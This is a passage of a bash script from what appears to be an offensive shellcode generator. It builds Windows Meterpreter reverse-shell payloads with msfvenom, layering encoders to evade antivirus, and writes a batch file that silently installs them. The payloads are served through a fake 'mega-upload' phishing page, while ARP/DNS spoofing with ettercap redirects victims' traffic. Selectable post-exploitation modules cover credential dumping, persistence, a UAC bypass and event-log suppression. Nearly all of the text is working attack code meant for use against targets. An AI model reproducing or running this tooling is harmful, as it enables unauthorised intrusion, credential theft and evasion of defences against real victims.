      leafpad $InJEc4 > /dev/null 2>&1
   else
      gedit $InJEc4 > /dev/null 2>&1
   fi


     cd $IPATH/templates
     mv $InJEc4 $IPATH/output/$N4m.rb


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.rb\n\nchose how to deliver: $N4m.rb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.rb|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.rb > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}






# -------------------------------------------
# build shellcode in MSI (windows-platforms)
# and build trigger.bat to use in winrar/sfx
# to be executable by pressing on it :D
# -------------------------------------------
sh_shellcode8 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> msi format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : MSI -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi"
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 8 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi"


echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
echo "[☠] Injecting shellcode -> $N4m.msi!"
sleep 2
# build winrar/SFX trigger.bat script
echo "[☠] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using msiexec" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "msiexec /quiet /qn /i $N4m.msi" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.msi\n$IPATH/output/trigger.bat\n\nExecute on cmd: msiexec /quiet /qn /i $N4m.msi\n\nchose how to deliver: $N4m.msi" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.msi|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
}





# --------------------------------------------------------------
# build shellcode powershell <DownloadString> + Invoke-Shellcode
# Matthew Graeber - powershell technics (Invoke-Shellcode)
# --------------------------------------------------------------
sh_shellcode9 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info > /dev/null 2>&1
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1

echo "[☠] Building shellcode -> powershell format ..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw

cd $IPATH/aux
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
rm *.ps1 > /dev/null 2>&1
rm *.vbs > /dev/null 2>&1

# display shellcode
mv *.bat $IPATH/bin/sedding.raw
disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'}`
echo "$disp" > $IPATH/output/chars.raw
echo ""
echo "[☠] shellcode -> powershell encoded!"
sleep 2
echo $disp
echo "" && echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


   # check if template exists
   if [ -e $InJEc8 ]; then
      echo "[☠] InvokePS1.bat -> found!"
      sleep 2
   else
      echo "[☠] InvokePS1.bat -> not found!"
      exit
   fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2
sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
mv $N4m.bat $IPATH/output/$N4m.bat
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
